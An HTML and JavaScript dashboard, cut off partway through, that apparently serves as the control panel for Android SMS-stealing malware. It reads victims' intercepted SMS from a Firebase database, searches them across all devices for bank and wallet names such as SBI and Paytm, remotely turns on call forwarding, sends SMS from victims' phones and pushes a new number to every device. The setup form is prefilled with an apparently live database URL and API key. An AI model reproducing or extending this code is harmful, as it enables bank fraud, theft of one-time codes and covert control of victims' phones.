<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
<title>CSC Admin - Complete Working Dashboard</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
:root{
  --bg:#f0f2f5;--white:#fff;--purple:#5b21b6;--purple2:#7c3aed;--purple-light:#ede9fe;
  --green:#16a34a;--red:#dc2626;--orange:#ea580c;--text:#1e293b;--muted:#64748b;
  --border:#e2e8f0;--shadow:0 2px 8px rgba(0,0,0,.08);--shadow2:0 8px 32px rgba(0,0,0,.18);
}
body{font-family:'Segoe UI',sans-serif;background:var(--bg);color:var(--text);}

#setup-screen{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;background:linear-gradient(135deg,#4c1d95,#1e1b4b);}
.setup-card{background:#fff;border-radius:20px;padding:32px 28px;width:100%;max-width:460px;box-shadow:var(--shadow2);}
.setup-logo{text-align:center;margin-bottom:22px;}
.setup-logo .ic{font-size:44px;}
.setup-logo h1{font-size:21px;font-weight:700;color:var(--purple);}
.setup-logo p{font-size:13px;color:var(--muted);margin-top:3px;}
.fg{margin-bottom:14px;}
.fg label{display:block;font-size:11px;font-weight:700;color:var(--muted);margin-bottom:5px;}
.fg input{width:100%;border:1.5px solid var(--border);border-radius:10px;padding:11px 13px;font-size:14px;outline:none;}
.fg input:focus{border-color:var(--purple2);}
.pbtn{width:100%;background:linear-gradient(135deg,var(--purple),var(--purple2));color:#fff;border:none;border-radius:10px;padding:13px;font-size:15px;font-weight:700;cursor:pointer;}
.errbox{background:#fef2f2;border:1px solid #fecaca;color:#b91c1c;padding:10px;border-radius:8px;font-size:13px;margin-top:10px;display:none;}

#login-screen{min-height:100vh;display:none;align-items:center;justify-content:center;padding:20px;background:linear-gradient(135deg,#4c1d95,#1e1b4b);}
.login-card{background:#fff;border-radius:20px;padding:36px 28px;width:100%;max-width:340px;box-shadow:var(--shadow2);text-align:center;}
.login-card .ic{font-size:44px;}
.login-card h2{font-size:19px;font-weight:700;color:var(--purple);margin:8px 0 4px;}
.login-card p{font-size:13px;color:var(--muted);margin-bottom:20px;}
.login-card input{width:100%;border:1.5px solid var(--border);border-radius:10px;padding:12px;font-size:18px;text-align:center;letter-spacing:3px;outline:none;margin-bottom:14px;}
.login-card input:focus{border-color:var(--purple2);}

#app{display:none;flex-direction:column;min-height:100vh;}
.topbar{background:linear-gradient(135deg,var(--purple),var(--purple2));padding:13px 16px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:200;}
.topbar-title{color:#fff;font-size:16px;font-weight:700;display:flex;align-items:center;gap:8px;}
.live-dot{width:8px;height:8px;border-radius:50%;background:#4ade80;animation:pulse 2s infinite;}
@keyframes pulse{0%,100%{opacity:1;}50%{opacity:.4;}}
.xbtn{background:rgba(255,255,255,.2);color:#fff;border:none;border-radius:8px;padding:6px 12px;font-size:12px;cursor:pointer;}

.search-sec{background:#fff;padding:11px 16px;border-bottom:1px solid var(--border);position:sticky;top:57px;z-index:190;}
.sw{position:relative;}
.sw input{width:100%;border:1.5px solid var(--border);border-radius:10px;padding:10px 38px;font-size:14px;outline:none;}
.sw input:focus{border-color:var(--purple2);}
.si{position:absolute;left:12px;top:50%;transform:translateY(-50%);font-size:16px;}
.sc{position:absolute;right:11px;top:50%;transform:translateY(-50%);background:none;border:none;font-size:15px;color:var(--muted);cursor:pointer;display:none;}

.stats-bar{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;padding:12px 16px;}
.sbox{background:#fff;border-radius:12px;padding:12px;text-align:center;box-shadow:var(--shadow);}
.snum{font-size:22px;font-weight:700;}
.slbl{font-size:11px;color:var(--muted);}
.reg-bar{background:#fff;padding:8px 16px;border-bottom:1px solid var(--border);font-size:13px;color:var(--muted);text-align:center;}
.upd-btn{display:block;margin:12px 16px;background:linear-gradient(135deg,var(--purple),var(--purple2));color:#fff;border:none;border-radius:10px;padding:14px;font-size:14px;font-weight:700;text-align:center;cursor:pointer;width:calc(100% - 32px);}

.dev-list{padding:0 16px 80px;}
.dev-card{background:#fff;border-radius:14px;padding:13px 15px;margin-bottom:10px;box-shadow:var(--shadow);cursor:pointer;}
.dev-card:active{transform:scale(.98);}
.dct{display:flex;align-items:center;gap:11px;}
.dnum{font-size:16px;font-weight:700;color:var(--muted);min-width:22px;}
.dic{font-size:28px;}
.dinf{flex:1;}
.dname{font-size:15px;font-weight:600;}
.did{font-size:11px;color:var(--muted);font-family:monospace;margin-top:2px;}
.dbat{font-size:12px;color:var(--muted);margin-top:2px;}
.dstat{text-align:center;padding:6px 0 0;font-size:12px;font-weight:600;border-top:1px solid var(--border);margin-top:10px;}
.son{color:var(--green);}
.soff{color:var(--red);}
.sbadge{background:var(--purple-light);color:var(--purple);font-size:11px;font-weight:700;padding:2px 8px;border-radius:20px;margin-left:auto;}

#detail-screen{display:none;flex-direction:column;min-height:100vh;}
.dtopbar{background:linear-gradient(135deg,var(--purple),var(--purple2));padding:13px 16px;display:flex;align-items:center;gap:11px;position:sticky;top:0;}
.bbtn{background:rgba(255,255,255,.2);color:#fff;border:none;border-radius:8px;padding:7px 12px;cursor:pointer;}
.dtitle{color:#fff;font-size:15px;font-weight:700;flex:1;}
.dactions{display:grid;grid-template-columns:1fr 1fr;gap:10px;padding:13px 16px;}
.actbtn{background:linear-gradient(135deg,var(--purple),var(--purple2));color:#fff;border:none;border-radius:10px;padding:13px;font-size:13px;font-weight:700;cursor:pointer;}
.sms-list-wrap{padding:0 16px 80px;}
.scard{background:#fff;border-radius:14px;padding:13px 15px;margin-bottom:10px;box-shadow:var(--shadow);}
.sadr{font-size:14px;font-weight:600;margin-bottom:5px;word-break:break-all;}
.sbody{font-size:13px;color:var(--muted);line-height:1.6;word-break:break-all;}
.stime{font-size:11px;color:var(--muted);text-align:right;margin-top:7px;}

#search-screen{display:none;flex-direction:column;min-height:100vh;}
.src-card{background:#fff;border-radius:14px;padding:13px 15px;margin-bottom:10px;box-shadow:var(--shadow);cursor:pointer;}
.sdlbl{font-size:12px;font-weight:700;color:var(--purple);background:var(--purple-light);padding:3px 10px;border-radius:20px;display:inline-block;margin-bottom:8px;}
.highlight{background:#fef08a;color:#713f12;border-radius:3px;padding:0 2px;font-weight:bold;}

.overlay{position:fixed;inset:0;background:rgba(0,0,0,.5);z-index:500;display:none;align-items:center;justify-content:center;padding:16px;}
.dialog{background:#fff;border-radius:20px;width:100%;max-width:440px;overflow:hidden;}
.dhdr{padding:17px 20px;text-align:center;font-size:17px;font-weight:700;color:#fff;background:linear-gradient(135deg,var(--purple),var(--purple2));}
.dbody{padding:18px 20px;}
.dinput{width:100%;border:1.5px solid var(--border);border-radius:10px;padding:11px 13px;font-size:15px;outline:none;margin-bottom:11px;}
.dbtn{width:100%;background:linear-gradient(135deg,var(--purple),var(--purple2));color:#fff;border:none;border-radius:10px;padding:13px;font-size:14px;font-weight:700;cursor:pointer;margin-bottom:9px;}
.dbtn-row{display:grid;grid-template-columns:1fr 1fr;gap:9px;margin-bottom:9px;}
.dbtn-h{background:linear-gradient(135deg,var(--purple),var(--purple2));color:#fff;border:none;border-radius:10px;padding:13px;font-size:14px;font-weight:700;cursor:pointer;}
.dbtn-h.red{background:linear-gradient(135deg,#dc2626,#ef4444);}
.dbtn-cancel{width:100%;background:var(--bg);color:var(--muted);border:1px solid var(--border);border-radius:10px;padding:11px;cursor:pointer;}
.sim-opt{display:flex;align-items:center;gap:11px;border:1.5px solid var(--border);border-radius:10px;padding:11px 13px;margin-bottom:9px;cursor:pointer;}
.sim-opt.sel{border-color:var(--purple2);background:var(--purple-light);}
.sim-ic{font-size:22px;}
.sim-inf{flex:1;}
.sim-nm{font-size:14px;font-weight:600;}
.sim-no{font-size:12px;color:var(--muted);}
.sim-rb{width:17px;height:17px;border-radius:50%;border:2px solid var(--border);}
.sim-rb.chk{border-color:var(--purple2);}
.sim-rb.chk::after{content:'';display:block;width:8px;height:8px;border-radius:50%;background:var(--purple2);margin:2px;}
.cf-res{background:#f0fdf4;border:1px solid #bbf7d0;color:#15803d;border-radius:8px;padding:9px 13px;font-size:13px;margin-bottom:10px;display:none;text-align:center;}

.loading{display:flex;justify-content:center;padding:48px;gap:11px;color:var(--muted);}
.spinner{width:21px;height:21px;border:2.5px solid var(--border);border-top-color:var(--purple2);border-radius:50%;animation:spin .8s linear infinite;}
@keyframes spin{to{transform:rotate(360deg);}}
.empty{text-align:center;padding:48px 16px;color:var(--muted);}
.empty .ei{font-size:38px;margin-bottom:10px;opacity:.5;}
#toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:#1e293b;color:#fff;padding:10px 20px;border-radius:20px;font-size:13px;z-index:9999;opacity:0;transition:opacity .3s;pointer-events:none;white-space:nowrap;}
</style>
</head>
<body>
  <!-- SETUP SCREEN -->
<div id="setup-screen">
  <div class="setup-card">
    <div class="setup-logo"><div class="ic">📡</div><h1>CSC Admin</h1><p>Firebase Configuration</p></div>
    <div class="fg"><label>Firebase URL</label><input id="cfg-url" placeholder="https://your-db.firebaseio.com" value="https://vkvkvk-61f36-default-rtdb.firebaseio.com/"></div>
    <div class="fg"><label>API Key</label><input id="cfg-key" type="password" placeholder="AIzaSy..." value="AIzaSyAniMS9v56_LHDoYg3eqyjjJAWeNUHOias"></div>
    <button class="pbtn" onclick="saveConfig()">Save & Continue</button>
    <div class="errbox" id="setup-err"></div>
  </div>
</div>

<!-- LOGIN SCREEN -->
<div id="login-screen">
  <div class="login-card">
    <div class="ic">🔐</div>
    <h2>Admin Login</h2>
    <p>Enter Admin Password</p>
    <input type="password" id="login-pass" placeholder="••••••" maxlength="20" onkeydown="if(event.key==='Enter')doLogin()" />
    <button class="pbtn" onclick="doLogin()">Login</button>
    <div class="errbox" id="login-err"></div>

</div>

<!-- MAIN APP DASHBOARD -->
<div id="app">
  <div class="topbar"><div class="topbar-title"><span class="live-dot"></span> CSC Admin</div><div><button class="xbtn" onclick="refreshData()">🔄</button><button class="xbtn" onclick="logout()">Logout</button></div></div>
  <div class="search-sec"><div class="sw"><span class="si">🔍</span><input id="global-search" placeholder="Search SMS in ALL devices (SBI, Paytm, Nearby, Spice)..." oninput="onSearch(this.value)" /><button class="sc" id="search-clear-btn" onclick="clearSearch()">✕</button></div></div>
  <div id="main-content"><div class="reg-bar" id="register-bar">Devices: --</div><button class="upd-btn" onclick="openUpdateNo()">📱 UPDATE NUMBER</button><div class="stats-bar"><div class="sbox"><div class="snum" id="s-total">0</div><div class="slbl">Devices</div></div><div class="sbox"><div class="snum" id="s-online">0</div><div class="slbl">Online</div></div><div class="sbox"><div class="snum" id="s-sms">0</div><div class="slbl">Total SMS</div></div></div><div class="dev-list" id="device-list"><div class="loading"><div class="spinner"></div> Loading devices...</div></div></div>
</div>

<!-- DETAIL SCREEN -->
<div id="detail-screen">
  <div class="dtopbar"><button class="bbtn" onclick="goBack()">← Back</button><div class="dtitle" id="detail-title">Device</div></div>
  <div class="dactions"><button class="actbtn" onclick="openCallFwd()">📞 CALL FORWARDING</button><button class="actbtn" onclick="openSmsSend()">✉️ SEND SMS</button></div>
  <div class="sms-list-wrap" id="sms-list"></div>
</div>

<!-- SEARCH RESULTS SCREEN -->
<div id="search-screen">
  <div class="topbar"><div class="topbar-title">🔍 Search Results</div><button class="xbtn" onclick="clearSearch()">← Back to Dashboard</button></div>
  <div style="padding:11px 16px;background:#fff;border-bottom:1px solid var(--border);" id="search-summary"></div>
  <div style="padding:8px 16px 80px;" id="search-results-list"></div>
</div>

<!-- DIALOGS -->
<div class="overlay" id="dlg-cf"><div class="dialog"><div class="dhdr">📞 Call Forwarding</div><div class="dbody"><div id="sim-list"></div><div class="fwd-lbl">Forward To Number</div><input class="dinput" id="cf-number" placeholder="+91XXXXXXXXXX" type="tel" /><div class="dbtn-row"><button class="dbtn-h" onclick="doCF('active')">ACTIVATE</button><button class="dbtn-h red" onclick="doCF('deactive')">DEACTIVATE</button></div><button class="dbtn" onclick="doCF('check')">CHECK STATUS</button><div class="cf-res" id="cf-result"></div><button class="dbtn-cancel" onclick="closeDialog('dlg-cf')">Cancel</button></div></div></div>

<div class="overlay" id="dlg-sms"><div class="dialog"><div class="dhdr">✉️ Send SMS</div><div class="dbody"><input class="dinput" id="sms-to" placeholder="Recipient Number" type="tel" /><textarea class="dinput" id="sms-msg" placeholder="Message" rows="4"></textarea><button class="dbtn" onclick="doSendSms()">SEND</button><button class="dbtn-cancel" onclick="closeDialog('dlg-sms')">Cancel</button></div></div></div>

<div class="overlay" id="dlg-update"><div class="dialog"><div class="dhdr">🔄 Update Number</div><div class="dbody"><input class="dinput" id="update-num" placeholder="New Number" type="tel" /><button class="dbtn" onclick="doUpdateNo()">UPDATE</button><button class="dbtn-cancel" onclick="closeDialog('dlg-update')">Cancel</button></div></div></div>

<div id="toast"></div>
<script>
// ========== GLOBAL VARIABLES ==========
var DB_URL = '', API_KEY = '';
var ADMIN_PASSWORD = '';
var DEVICES_LIST = [];      // verify_device se device IDs
var DEVICES_DATA = {};      // all data per device
var currentDeviceKey = null;
var selectedSim = 0;
var pollTimer = null;
var toastTimer = null;

// ========== FIREBASE HELPERS ==========
function fbGet(path) {
  return fetch(DB_URL + '/' + path + '.json?auth=' + API_KEY)
    .then(function(r) { return r.json(); })
    .catch(function(e) { console.error(e); return null; });
}

function fbSet(path, data) {
  return fetch(DB_URL + '/' + path + '.json?auth=' + API_KEY, {
    method: 'PUT',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  }).then(function(r) { return r.json(); });
}

// ========== SAVE CONFIG ==========
function saveConfig() {
  DB_URL = document.getElementById('cfg-url').value.trim().replace(/\/$/, '');
  API_KEY = document.getElementById('cfg-key').value.trim();
  
  if (!DB_URL || !API_KEY) {
    showSetupErr('Please enter both URL and API Key');
    return;
  }
  
  var btn = event.target;
  btn.disabled = true;
  btn.textContent = 'Checking...';
  
  // Fetch Admin Password from csc6/Admin_Password
  fbGet('csc6/Admin_Password').then(function(password) {
    if (!password) {
      showSetupErr('Admin_Password not found in csc6/Admin_Password');
      btn.disabled = false;
      btn.textContent = 'Save & Continue';
      return;
    }
    ADMIN_PASSWORD = String(password);
    document.getElementById('setup-screen').style.display = 'none';
    document.getElementById('login-screen').style.display = 'flex';
    document.getElementById('login-pass').value = '';
    document.getElementById('login-pass').focus();
    btn.disabled = false;
    btn.textContent = 'Save & Continue';
    showToast('Configuration saved! Please login.');
  }).catch(function(e) {
    showSetupErr('Connection failed: ' + e.message);
    btn.disabled = false;
    btn.textContent = 'Save & Continue';
  });
}

function showSetupErr(msg) {
  var err = document.getElementById('setup-err');
  err.textContent = msg;
  err.style.display = 'block';
  setTimeout(function() { err.style.display = 'none'; }, 4000);
}

// ========== LOGIN ==========
function doLogin() {
  var pass = document.getElementById('login-pass').value;
  if (pass === ADMIN_PASSWORD) {
    document.getElementById('login-screen').style.display = 'none';
    document.getElementById('app').style.display = 'flex';
    loadAllData();
    startPolling();
    showToast('Login successful!');
  } else {
    var err = document.getElementById('login-err');
    err.textContent = '❌ Wrong password!';
    err.style.display = 'block';
    setTimeout(function() { err.style.display = 'none'; }, 3000);
  }
}

function logout() {
  stopPolling();
  document.getElementById('app').style.display = 'none';
  document.getElementById('detail-screen').style.display = 'none';
  document.getElementById('search-screen').style.display = 'none';
  document.getElementById('login-screen').style.display = 'flex';
  document.getElementById('login-pass').value = '';
  showToast('Logged out');
}
  // ========== LOAD ALL DATA ==========
function loadAllData() {
  // Step 1: Get all device IDs from verify_device
  fbGet('verify_device').then(function(devices) {
    if (!devices) {
      document.getElementById('device-list').innerHTML = '<div class="empty"><div class="ei">📱</div><p>No devices found in verify_device</p></div>';
      DEVICES_LIST = [];
      updateStats();
      return;
    }
    
    DEVICES_LIST = Object.keys(devices);
    console.log('Devices found:', DEVICES_LIST.length);
    
    // Step 2: For each device, fetch its data from all_user nodes
    var promises = [];
    DEVICES_LIST.forEach(function(deviceId) {
      promises.push(fetchDeviceData(deviceId));
    });
    
    Promise.all(promises).then(function() {
      renderDeviceList();
      updateStats();
      
      var searchQuery = document.getElementById('global-search').value.trim();
      if (searchQuery) {
        runSearch(searchQuery);
      }
    }).catch(function(e) {
      showToast('Error loading device data: ' + e.message);
    });
  }).catch(function(e) {
    showToast('Error loading verify_device: ' + e.message);
    document.getElementById('device-list').innerHTML = '<div class="empty"><div class="ei">📱</div><p>Error loading devices</p></div>';
  });
}

function fetchDeviceData(deviceId) {
  // Fetch all data for a device from different nodes in all_user
  return Promise.all([
    fbGet('csc6/all_user/Info/' + deviceId),
    fbGet('csc6/all_user/Sms/' + deviceId),
    fbGet('csc6/all_user/SimINFO/' + deviceId),
    fbGet('csc6/all_user/Call_For/' + deviceId),
    fbGet('csc6/all_user/Data/' + deviceId),
    fbGet('csc6/all_user/Forwad_Status/' + deviceId),
    fbGet('csc6/all_user/User/' + deviceId)
  ]).then(function(results) {
    var info = results[0] || {};
    var smsRaw = results[1] || {};
    var simInfo = results[2] || {};
    var callFor = results[3] || {};
    var data = results[4] || {};
    var fwdStatus = results[5] || {};
    var user = results[6] || {};
    
    var smsArr = objToArr(smsRaw);
    var statusText = String(info.Status || '').toLowerCase();
    var isOnline = (statusText === 'online' || statusText === '1' || statusText === 'true');
    
    DEVICES_DATA[deviceId] = {
      key: deviceId,
      name: info.MobileName || info.mobileName || info.DeviceName || info.name || deviceId,
      id: info.DeviceId || info.deviceId || deviceId,
      battery: info.Battery || info.battery || '—',
      status: isOnline ? 'online' : 'offline',
      sms: smsArr,
      simInfo: simInfo,
      callFor: callFor,
      data: data,
      fwdStatus: fwdStatus,
      user: user,
      rawInfo: info
    };
  });
}

function refreshData() {
  loadAllData();
  showToast('🔄 Refreshed!');
}

function startPolling() {
  stopPolling();
  pollTimer = setInterval(loadAllData, 15000);
}

function stopPolling() {
  if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
}

function updateStats() {
  document.getElementById('s-total').textContent = DEVICES_LIST.length;
  var onlineCount = 0;
  var totalSms = 0;
  for (var i = 0; i < DEVICES_LIST.length; i++) {
    var dev = DEVICES_DATA[DEVICES_LIST[i]];
    if (dev && dev.status === 'online') onlineCount++;
    if (dev && dev.sms) totalSms += dev.sms.length;
  }
  document.getElementById('s-online').textContent = onlineCount;
  document.getElementById('s-sms').textContent = totalSms;
  
  var anyDev = DEVICES_DATA[DEVICES_LIST[0]];
  if (anyDev && anyDev.data && anyDev.data.RegisterDate) {
    document.getElementById('register-bar').textContent = '📅 Register Date: ' + anyDev.data.RegisterDate;
  } else {
    document.getElementById('register-bar').textContent = 'Total Devices: ' + DEVICES_LIST.length;
  }
}

// ========== RENDER DEVICE LIST ==========
function renderDeviceList() {
  var container = document.getElementById('device-list');
  
  if (DEVICES_LIST.length === 0) {
    container.innerHTML = '<div class="empty"><div class="ei">📱</div><p>No devices available</p></div>';
    return;
  }
  
  var html = '';
  for (var i = 0; i < DEVICES_LIST.length; i++) {
    var deviceId = DEVICES_LIST[i];
    var d = DEVICES_DATA[deviceId];
    if (!d) continue;
    
    var batteryHtml = (d.battery && d.battery !== '—') ? '<div class="dbat">🔋 Battery: ' + escapeHtml(d.battery) + '%</div>' : '';
    var statusClass = d.status === 'online' ? 'son' : 'soff';
    var statusText = d.status === 'online' ? 'Online User' : 'Offline User';
    var smsCount = d.sms ? d.sms.length : 0;
    
    html += '<div class="dev-card" onclick="openDevice(\'' + escapeHtml(deviceId) + '\')">' +
      '<div class="dct">' +
      '<div class="dnum">' + (i + 1) + '</div>' +
      '<div class="dic">📱</div>' +
      '<div class="dinf">' +
      '<div class="dname">' + escapeHtml(d.name) + '</div>' +
      '<div class="did">ID: ' + escapeHtml(d.id) + '</div>' +
      batteryHtml +
      '</div>' +
      '<div class="sbadge">💬 ' + smsCount + '</div>' +
      '</div>' +
      '<div class="dstat ' + statusClass + '">Status: ' + statusText + '</div>' +
      '</div>';
  }
  container.innerHTML = html;
       }
  // ========== DEVICE DETAIL ==========
function openDevice(deviceId) {
  currentDeviceKey = deviceId;
  document.getElementById('app').style.display = 'none';
  document.getElementById('search-screen').style.display = 'none';
  var detailScreen = document.getElementById('detail-screen');
  detailScreen.style.display = 'flex';
  var dev = DEVICES_DATA[deviceId];
  document.getElementById('detail-title').textContent = dev ? escapeHtml(dev.name) : deviceId;
  renderSmsList(deviceId);
  window.scrollTo(0, 0);
}

function renderSmsList(deviceId) {
  var dev = DEVICES_DATA[deviceId];
  var container = document.getElementById('sms-list');
  
  if (!dev || !dev.sms || dev.sms.length === 0) {
    container.innerHTML = '<div class="empty"><div class="ei">💬</div><p>No SMS messages for this device</p></div>';
    return;
  }
  
  var sorted = [].concat(dev.sms).sort(function(a, b) { return getTimestamp(b) - getTimestamp(a); });
  
  var html = '';
  for (var i = 0; i < sorted.length; i++) {
    var s = sorted[i];
    var addr = s.address || s.sender || s.from || s.number || s.Address || 'Unknown';
    var body = s.body || s.message || s.text || s.content || s.Body || s.Message || '';
    var timeVal = s.date || s.timestamp || s.time || s.Date || '';
    html += '<div class="scard">' +
      '<div class="sadr">📞 From: ' + escapeHtml(String(addr)) + '</div>' +
      '<div class="sbody">' + escapeHtml(String(body)) + '</div>' +
      '<div class="stime">🕒 ' + formatDate(timeVal) + '</div>' +
      '</div>';
  }
  container.innerHTML = html;
}

function goBack() {
  document.getElementById('detail-screen').style.display = 'none';
  var searchQuery = document.getElementById('global-search').value.trim();
  if (searchQuery) {
    document.getElementById('search-screen').style.display = 'flex';
  } else {
    document.getElementById('app').style.display = 'flex';
  }
  window.scrollTo(0, 0);
}

// ========== GLOBAL SEARCH - ALL DEVICES ==========
function onSearch(val) {
  var clearBtn = document.getElementById('search-clear-btn');
  clearBtn.style.display = val ? 'block' : 'none';
  
  if (!val.trim()) {
    document.getElementById('search-screen').style.display = 'none';
    document.getElementById('app').style.display = 'flex';
    return;
  }
  runSearch(val.trim());
}

function runSearch(keyword) {
  document.getElementById('app').style.display = 'none';
  document.getElementById('detail-screen').style.display = 'none';
  document.getElementById('search-screen').style.display = 'flex';
  
  var keywordLower = keyword.toLowerCase();
  var results = [];
  
  // Search through ALL devices' SMS
  for (var i = 0; i < DEVICES_LIST.length; i++) {
    var deviceId = DEVICES_LIST[i];
    var device = DEVICES_DATA[deviceId];
    if (!device || !device.sms) continue;
    
    var matchedSms = [];
    for (var j = 0; j < device.sms.length; j++) {
      var sms = device.sms[j];
      var body = (sms.body || sms.message || sms.text || sms.content || sms.Body || sms.Message || '').toLowerCase();
      var addr = (sms.address || sms.sender || sms.from || sms.number || sms.Address || '').toLowerCase();
      if (body.includes(keywordLower) || addr.includes(keywordLower)) {
        matchedSms.push(sms);
      }
    }
    
    if (matchedSms.length > 0) {
      results.push({
        device: device,
        matches: matchedSms
      });
    }
  }
  
  var totalMatches = 0;
  for (var i = 0; i < results.length; i++) {
    totalMatches += results[i].matches.length;
  }
  
  var summaryText = results.length > 0 
    ? '🔎 "' + escapeHtml(keyword) + '" — Found in ' + results.length + ' device(s), total ' + totalMatches + ' SMS messages'
    : '🔎 "' + escapeHtml(keyword) + '" — No matching SMS found in any device';
  document.getElementById('search-summary').innerHTML = summaryText;
  
  var container = document.getElementById('search-results-list');
  
  if (results.length === 0) {
    container.innerHTML = '<div class="empty"><div class="ei">🔍</div><p>No SMS found with keyword: "' + escapeHtml(keyword) + '"</p></div>';
    return;
  }
  
  var html = '';
  for (var i = 0; i < results.length; i++) {
    var result = results[i];
    var previewSms = '';
    var maxPreview = Math.min(3, result.matches.length);
    for (var j = 0; j < maxPreview; j++) {
      var sms = result.matches[j];
      var addr = sms.address || sms.sender || sms.from || sms.number || sms.Address || '';
      var body = sms.body || sms.message || sms.text || sms.content || sms.Body || sms.Message || '';
      previewSms += '<div class="scard" style="margin-bottom:8px;padding:10px;">' +
        '<div class="sadr" style="font-size:12px;">📞 ' + escapeHtml(String(addr)) + '</div>' +
        '<div class="sbody" style="font-size:12px;">' + highlightText(escapeHtml(String(body)), keyword) + '</div>' +
        '</div>';
    }
    
    var moreCount = result.matches.length - 3;
    var moreHtml = moreCount > 0 ? '<div style="font-size:12px;color:var(--purple);text-align:center;padding:8px 0 4px;">+' + moreCount + ' more SMS — Tap to view all</div>' : '';
    
    html += '<div class="src-card" onclick="openDevice(\'' + escapeHtml(result.device.key) + '\')">' +
      '<div style="display:flex;align-items:center;flex-wrap:wrap;gap:8px;margin-bottom:10px;">' +
      '<span class="sdlbl">📱 ' + escapeHtml(result.device.name) + '</span>' +
      '<span class="smcnt">' + result.matches.length + ' SMS matched</span>' +
      '</div>' +
      previewSms +
      moreHtml +
      '</div>';
  }
  container.innerHTML = html;
}

function clearSearch() {
  document.getElementById('global-search').value = '';
  document.getElementById('search-clear-btn').style.display = 'none';
  document.getElementById('search-screen').style.display = 'none';
  document.getElementById('app').style.display = 'flex';
}

function highlightText(text, keyword) {
  try {
    var regex = new RegExp('(' + keyword.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + ')', 'gi');
    return text.replace(regex, '<span class="highlight">$1</span>');
  } catch(e) {
    return text;
  }
}
  // ========== CALL FORWARDING ==========
function openCallFwd() {
  var dev = DEVICES_DATA[currentDeviceKey];
  if (!dev) { showToast('Device not found'); return; }
  
  var sims = dev.simInfo || {};
  var keys = Object.keys(sims);
  var html = '';
  
  if (keys.length) {
    for (var i = 0; i < Math.min(2, keys.length); i++) {
      var k = keys[i];
      var s = sims[k];
      var num = s.number || s.phoneNumber || s.Number || s.SimNumber || '—';
      var op = s.operator || s.carrier || s.Operator || '—';
      html += '<div class="sim-opt' + (i === selectedSim ? ' sel' : '') + '" onclick="selectSim(' + i + ')">' +
        '<div class="sim-ic">📶</div>' +
        '<div class="sim-inf"><div class="sim-nm">SIM ' + (i + 1) + '</div><div class="sim-no">' + escapeHtml(String(num)) + ' · ' + escapeHtml(String(op)) + '</div></div>' +
        '<div class="sim-rb' + (i === selectedSim ? ' chk' : '') + '"></div></div>';
    }
  } else {
    html = '<div class="sim-opt sel" onclick="selectSim(0)"><div class="sim-ic">📶</div><div class="sim-inf"><div class="sim-nm">SIM 1</div><div class="sim-no">Default SIM</div></div><div class="sim-rb chk"></div></div>' +
      '<div class="sim-opt" onclick="selectSim(1)"><div class="sim-ic">📶</div><div class="sim-inf"><div class="sim-nm">SIM 2</div><div class="sim-no">Not available</div></div><div class="sim-rb"></div></div>';
  }
  
  document.getElementById('sim-list').innerHTML = html;
  document.getElementById('cf-result').style.display = 'none';
  document.getElementById('cf-number').value = '';
  openDialog('dlg-cf');
}

function selectSim(i) {
  selectedSim = i;
  var simOpts = document.querySelectorAll('.sim-opt');
  for (var j = 0; j < simOpts.length; j++) {
    simOpts[j].classList.toggle('sel', j === i);
    var rb = simOpts[j].querySelector('.sim-rb');
    if (rb) rb.classList.toggle('chk', j === i);
  }
}

function doCF(action) {
  var num = document.getElementById('cf-number').value.trim();
  if (action !== 'check' && !num) { showToast('Please enter forwarding number'); return; }
  
  var path = 'csc6/all_user/Call_For/' + currentDeviceKey;
  
  if (action === 'check') {
    fbGet(path).then(function(data) {
      var resDiv = document.getElementById('cf-result');
      resDiv.style.display = 'block';
      if (data && data.ForwardTo) {
        resDiv.textContent = '📞 Forward To: ' + data.ForwardTo + ' | Status: ' + (data.Status || 'active');
      } else {
        resDiv.textContent = 'No call forwarding configured for this device';
      }
    }).catch(function() { showToast('Check failed'); });
    return;
  }
  
  fbSet(path, { ForwardTo: num, Status: action, Sim: selectedSim + 1, updatedAt: Date.now() }).then(function() {
    showToast(action === 'active' ? '✅ Call Forwarding Activated!' : '✅ Call Forwarding Deactivated!');
    closeDialog('dlg-cf');
  }).catch(function(e) { showToast('Error: ' + e.message); });
}

// ========== SMS SEND ==========
function openSmsSend() {
  document.getElementById('sms-to').value = '';
  document.getElementById('sms-msg').value = '';
  openDialog('dlg-sms');
}

function doSendSms() {
  var to = document.getElementById('sms-to').value.trim();
  var msg = document.getElementById('sms-msg').value.trim();
  if (!to || !msg) { showToast('Both number and message required'); return; }
  
  fbSet('csc6/all_user/SendSms/' + currentDeviceKey, {
    to: to,
    message: msg,
    status: 'pending',
    timestamp: Date.now()
  }).then(function() {
    showToast('✅ SMS command sent to device!');
    closeDialog('dlg-sms');
  }).catch(function(e) { showToast('Error: ' + e.message); });
}

// ========== UPDATE NUMBER ==========
function openUpdateNo() {
  document.getElementById('update-num').value = '';
  openDialog('dlg-update');
}

function doUpdateNo() {
  var num = document.getElementById('update-num').value.trim();
  if (!num) { showToast('Please enter a number'); return; }
  
  if (DEVICES_LIST.length === 0) { showToast('No devices found'); return; }
  
  var completed = 0;
  for (var i = 0; i < DEVICES_LIST.length; i++) {
    var deviceId = DEVICES_LIST[i];
    fbSet('csc6/all_user/UpdateNo/' + deviceId, num).then(function() {
      completed++;
      if (completed === DEVICES_LIST.length) {
        showToast('✅ Updated ' + completed + ' device(s)!');
        closeDialog('dlg-update');
      }
    }).catch(function() {
      completed++;
      if (completed === DEVICES_LIST.length) {
        showToast('⚠️ Partial update completed');
        closeDialog('dlg-update');
      }
    });
  }
}

// ========== UTILITIES ==========
function objToArr(obj) {
  if (!obj || typeof obj !== 'object') return [];
  var arr = [];
  var keys = Object.keys(obj);
  for (var i = 0; i < keys.length; i++) {
    var k = keys[i];
    var v = obj[k];
    var item = { _key: k };
    if (typeof v === 'object' && v !== null) {
      for (var prop in v) {
        item[prop] = v[prop];
      }
    } else {
      item.value = v;
    }
    arr.push(item);
  }
  return arr;
}

function getTimestamp(item) {
  var t = item.timestamp || item.date || item.time || item.Date || 0;
  if (typeof t === 'number') return t > 1e10 ? t : t * 1000;
  try { return new Date(t).getTime() || 0; } catch(e) { return 0; }
}

function formatDate(t) {
